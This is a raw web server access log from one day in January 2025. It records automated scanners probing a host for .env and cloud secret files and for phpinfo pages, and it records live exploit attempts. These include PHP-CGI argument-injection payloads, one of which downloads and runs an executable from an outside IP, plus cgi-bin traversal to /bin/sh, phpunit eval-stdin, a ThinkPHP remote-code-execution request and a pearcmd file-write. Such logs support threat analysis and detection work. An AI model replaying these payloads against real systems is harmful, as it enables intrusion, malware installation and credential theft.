172.202.246.146 - - [09/Jan/2025:00:18:07 +0000] "GET /portal/redlion HTTP/1.1" 302 331 "-" "Mozilla/5.0 zgrab/0.x"
34.76.133.13 - - [09/Jan/2025:16:22:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "python-requests/2.32.3"
193.34.212.75 - - [09/Jan/2025:16:25:00 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:10 +0000] "GET / HTTP/1.1" 200 1003 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:12 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:12 +0000] "GET /.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:13 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:13 +0000] "GET /phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:16 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:17 +0000] "GET /phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:17 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:19 +0000] "GET /portal/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:20 +0000] "GET /env/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:24 +0000] "GET /api/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:25 +0000] "GET /app/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:26 +0000] "GET /dev/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:27 +0000] "GET /new/.env.local HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:28 +0000] "GET /new/.env.production HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:29 +0000] "GET /new/.env.staging HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:30 +0000] "GET /_phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:32 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:34 +0000] "GET /_profiler/phpinfo/info.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:35 +0000] "GET /_profiler/phpinfo/phpinfo.php HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:37 +0000] "GET /wp-config HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:38 +0000] "GET /aws-secret.yaml HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:40 +0000] "GET /awstats/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:43 +0000] "GET /conf/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:45 +0000] "GET /cron/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:47 +0000] "GET /www/.env HTTP/1.1" 302 386 "-" "-"
193.41.206.24 - - [09/Jan/2025:16:35:49 +0000] "GET /docker/.env HTTP/1.1" 302 386 "-" "-"
185.16.39.104 - - [09/Jan/2025:16:49:30 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.121.79.3 - - [09/Jan/2025:16:52:00 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
87.120.125.13 - - [09/Jan/2025:16:59:17 +0000] "GET /cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?> HTTP/1.1" 302 331 "-" "Go-http-client/1.1"
87.120.125.13 - - [09/Jan/2025:16:59:44 +0000] "GET / HTTP/1.1" 200 947 "http://35.220.248.27/cgi-bin/php-cgi.exe?arg=%0aContent-Type:%20text/plain%0a%0a<?php%20system('curl%20-L%20-k%20-O%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe%20%7C%7C%20wget%20--no-check-certificate%20http%3A%2F%2F23.27.51.244%2Fdr0p.exe%20%26%26%20.%2Fdr0p.exe');?>" "Go-http-client/1.1"
78.153.140.93 - - [09/Jan/2025:17:02:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:17:02:18 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:17:15:42 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:17:25:27 +0000] "\x16\x03\x02\x01o\x01" 400 526 "-" "-"
93.174.93.12 - - [09/Jan/2025:17:25:51 +0000] "GET / HTTP/1.0" 200 1761 "-" "Mozilla/5.0 (Linux; Android 4.3; SPH-L710 Build/JSS15J) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/32.0.1700.99 Mobile Safari/537.36"
152.42.219.47 - - [09/Jan/2025:17:27:08 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
152.42.219.47 - - [09/Jan/2025:17:27:16 +0000] "\x16\x03\x01\x01\v\x01" 400 526 "-" "-"
83.222.191.146 - - [09/Jan/2025:17:29:53 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
78.153.140.93 - - [09/Jan/2025:18:07:39 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:07:40 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+allow_url_include%3Don+%ADd+auto_prepend_file%3Dphp%3A//input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:00 +0000] "POST /php-cgi/php-cgi.exe?%ADd+cgi.force_redirect%3D0+%ADd+cgi.redirect_status_env+%ADd+allow_url_include%3D1+%ADd+auto_prepend_file%3Dphp://input HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
61.35.17.242 - - [09/Jan/2025:18:28:01 +0000] "GET / HTTP/1.1" 200 944 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.3"
185.196.9.31 - - [09/Jan/2025:18:28:22 +0000] "GET /.git/config HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; Android 8.1.0; vivo 1802 Build/O11019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36 VivoBrowser/5.8.0.10"
45.95.147.253 - - [09/Jan/2025:18:35:49 +0000] "GET / HTTP/1.0" 200 1761 "-" "ivre-masscan/1.3 https://github.com/robertdavidgraham/"
78.153.140.93 - - [09/Jan/2025:18:44:15 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:18:44:15 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
209.145.53.161 - - [09/Jan/2025:18:44:27 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:28 +0000] "POST /cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh HTTP/1.1" 400 487 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:29 +0000] "POST /hello.world?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input HTTP/1.1" 302 387 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:29 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:30 +0000] "GET /vendor/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:31 +0000] "GET /vendor/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:31 +0000] "GET /vendor/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:32 +0000] "GET /vendor/phpunit/phpunit/LICENSE/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:32 +0000] "GET /vendor/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:33 +0000] "GET /phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:33 +0000] "GET /phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:34 +0000] "GET /phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:35 +0000] "GET /phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:35 +0000] "GET /lib/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:36 +0000] "GET /lib/phpunit/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:37 +0000] "GET /lib/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:38 +0000] "GET /lib/phpunit/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:38 +0000] "GET /lib/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:39 +0000] "GET /laravel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:40 +0000] "GET /www/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:40 +0000] "GET /ws/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:41 +0000] "GET /yii/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:42 +0000] "GET /zend/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:42 +0000] "GET /ws/ec/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:43 +0000] "GET /V2/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:44 +0000] "GET /tests/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /test/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /testing/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:45 +0000] "GET /api/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:46 +0000] "GET /demo/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:46 +0000] "GET /cms/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /crm/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /admin/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:48 +0000] "GET /backup/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:49 +0000] "GET /blog/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:49 +0000] "GET /workspace/drupal/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /panel/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /public/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:50 +0000] "GET /apps/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:51 +0000] "GET /app/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:51 +0000] "GET /index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:52 +0000] "GET /public/index.php?s=/index/\\think\\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=Hello HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:53 +0000] "GET /index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\"hi\"));?>+/tmp/index1.php HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:53 +0000] "GET /index.php?lang=../../../../../../../../tmp/index1 HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
209.145.53.161 - - [09/Jan/2025:18:44:54 +0000] "GET /containers/json HTTP/1.1" 302 386 "-" "Custom-AsyncHttpClient"
139.59.101.104 - - [09/Jan/2025:19:14:36 +0000] "GET /cdn-cgi/trace HTTP/1.1" 302 350 "-" "Mozilla/5.0"
179.43.191.146 - - [09/Jan/2025:19:36:40 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
80.82.77.202 - - [09/Jan/2025:19:39:16 +0000] "GET / HTTP/1.0" 200 1761 "-" "WebCopier v4.6"
45.156.129.130 - - [09/Jan/2025:19:48:23 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
91.223.3.201 - - [09/Jan/2025:19:57:23 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
78.153.140.93 - - [09/Jan/2025:19:57:54 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:19:57:55 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.34.212.75 - - [09/Jan/2025:20:07:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
87.121.79.3 - - [09/Jan/2025:20:20:24 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
95.214.55.226 - - [09/Jan/2025:20:42:19 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
195.3.223.55 - - [09/Jan/2025:20:48:27 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
205.210.31.29 - - [09/Jan/2025:21:05:11 +0000] "\x16\x03\x01" 400 526 "-" "-"
205.210.31.29 - - [09/Jan/2025:21:05:11 +0000] "\x16\x03\x01" 400 526 "-" "-"
78.153.140.93 - - [09/Jan/2025:21:14:18 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:21:14:19 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
51.15.19.32 - - [09/Jan/2025:21:16:56 +0000] "GET /cgi-bin/luci/;stok=/locale HTTP/1.1" 302 331 "-" "-"
51.15.19.32 - - [09/Jan/2025:21:16:57 +0000] "GET / HTTP/1.1" 200 1742 "http://35.220.248.27:80/cgi-bin/luci/;stok=/locale" "-"
78.153.140.93 - - [09/Jan/2025:21:24:06 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:21:24:07 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
193.200.78.250 - - [09/Jan/2025:21:27:39 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
46.19.138.234 - - [09/Jan/2025:21:40:25 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
222.118.254.5 - - [09/Jan/2025:21:41:46 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
92.255.57.58 - - [09/Jan/2025:21:48:06 +0000] "GET /?XDEBUG_SESSION_START=phpstorm HTTP/1.1" 200 966 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
178.215.236.132 - - [09/Jan/2025:21:49:24 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Linux; U; Android 8.1.0; en-US; Infinix X624B Build/O11019) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/57.0.2987.108 UCBrowser/12.13.0.1207 Mobile Safari/537.36"
206.168.34.214 - - [09/Jan/2025:21:53:57 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
206.168.34.214 - - [09/Jan/2025:21:54:03 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:10 +0000] "GET /favicon.ico HTTP/1.1" 302 350 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:11 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27/favicon.ico" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
206.168.34.214 - - [09/Jan/2025:21:54:11 +0000] "PRI * HTTP/2.0" 400 526 "-" "-"
91.223.3.201 - - [09/Jan/2025:22:02:04 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
45.156.129.57 - - [09/Jan/2025:22:03:21 +0000] "GET / HTTP/1.1" 200 947 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
85.46.111.41 - - [09/Jan/2025:22:17:18 +0000] "GET / HTTP/1.0" 200 1761 "-" "curl/7.88.1"
193.200.78.250 - - [09/Jan/2025:22:25:01 +0000] "GET /logon.htm HTTP/1.1" 302 331 "-" "Hello World"
193.34.212.75 - - [09/Jan/2025:22:35:05 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
78.153.140.93 - - [09/Jan/2025:22:38:16 +0000] "GET /.env HTTP/1.1" 302 387 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
78.153.140.93 - - [09/Jan/2025:22:38:17 +0000] "POST / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.140 Safari/537.36"
185.16.39.104 - - [09/Jan/2025:22:56:32 +0000] "GET / HTTP/1.1" 200 1003 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
92.255.57.58 - - [09/Jan/2025:22:58:28 +0000] "GET /actuator/gateway/routes HTTP/1.1" 302 350 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
92.255.57.58 - - [09/Jan/2025:22:58:28 +0000] "GET / HTTP/1.1" 200 966 "http://35.220.248.27:80/actuator/gateway/routes" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
49.51.204.74 - - [09/Jan/2025:23:01:24 +0000] "GET / HTTP/1.1" 200 966 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 13_2_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.0.3 Mobile/15E148 Safari/604.1"
87.120.115.34 - - [09/Jan/2025:23:07:20 +0000] "GET /_profiler/phpinfo HTTP/1.1" 302 350 "-" "Mozilla/5.0 (X11; Linux i686; rv:127.0) Gecko/20100101 Firefox/127.0"
95.214.55.226 - - [09/Jan/2025:23:10:04 +0000] "GET / HTTP/1.1" 200 1742 "-" "-"
